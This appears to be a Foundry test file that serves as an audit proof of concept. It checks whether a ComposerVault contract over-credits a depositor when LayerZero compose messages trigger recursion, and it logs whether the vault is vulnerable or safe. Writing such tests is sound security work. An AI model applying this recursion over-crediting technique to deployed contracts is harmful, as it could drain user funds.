// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { ComposerVault } from "../src/ComposerVault.sol";
import { console2 } from "forge-std/console2.sol";

contract RealOFTComposeRecursionDrain is TestHelperOz5 {
    ComposerVault vault;
    uint32 aEid = 1;
    uint32 bEid = 2;
    address OWNER = address(0x1111);
    address HONEST_DEPOSITOR = address(0xBEEF);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(2, LibraryType.UltraLightNode);
        vm.deal(OWNER, 100 ether);
        vm.deal(HONEST_DEPOSITOR, 100 ether);

        vault = new ComposerVault(address(endpoints[bEid]));
    }

    function test_ATTACK_RealOFTComposeRecursion_ON_REAL_CODE() public {
        console2.log("=== Testing whether REAL, protocol-shaped OFTComposeMsgCodec envelopes ===");
        console2.log("=== still allow recursion-based over-crediting when the COMPOSER ===");
        console2.log("=== reuses genuinely real, originally-bound values at every self-triggered level ===");

        // Directly drive the compose path with a REAL OFTComposeMsgCodec
        // envelope, matching exactly what OFTCore._lzReceive constructs,
        // to isolate the recursion question from OFT-peer-wiring
        // complexity (already proven safe/real in RealOFTAccountingTest).
        uint64 realNonce = 1;
        uint32 realSrcEid = aEid;
        uint256 realAmountLD = 5 ether; // the ONE real, honest transfer amount
        bytes32 realComposeFrom = bytes32(uint256(uint160(HONEST_DEPOSITOR)));

        bytes memory realEnvelope = abi.encodePacked(realNonce, realSrcEid, realAmountLD, realComposeFrom);

        console2.log("REAL, single, honest transfer amount:", realAmountLD);
        console2.log("REAL composeFrom (honest depositor):", HONEST_DEPOSITOR);

        ILayerZeroEndpointV2Local endpoint = ILayerZeroEndpointV2Local(address(endpoints[bEid]));
        bytes32 guid = keccak256("real-compose-chain");

        vm.prank(HONEST_DEPOSITOR);
        endpoint.sendCompose(address(vault), guid, 0, realEnvelope);
        vm.prank(HONEST_DEPOSITOR);
        endpoint.lzCompose(HONEST_DEPOSITOR, address(vault), guid, 0, realEnvelope, bytes(""));

        console2.log("=== GROUND TRUTH ===");
        console2.log("Recursion levels triggered:", vault.recursionCount());
        console2.log("Vault credit for HONEST_DEPOSITOR:", vault.vaultCredit(HONEST_DEPOSITOR));
        console2.log("Expected if SAFE (no double-count):", realAmountLD);
        console2.log("Expected if VULNERABLE (5 levels x amount):", realAmountLD * 5);

        if (vault.vaultCredit(HONEST_DEPOSITOR) > realAmountLD) {
            console2.log("!!!!! CONFIRMED: even a REAL, protocol-shaped, correctly-bound envelope !!!!!");
            console2.log("!!!!! gets over-credited via composer-triggered recursion !!!!!");
            console2.log("!!!!! Over-credit factor:", vault.vaultCredit(HONEST_DEPOSITOR) / realAmountLD);
        } else {
            console2.log("SAFE: real envelope binding survived recursion - hypothesis does not hold here.");
        }
    }
}

interface ILayerZeroEndpointV2Local {
    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external;
    function lzCompose(address _from, address _to, bytes32 _guid, uint16 _index, bytes calldata _message, bytes calldata _extraData) external payable;
}
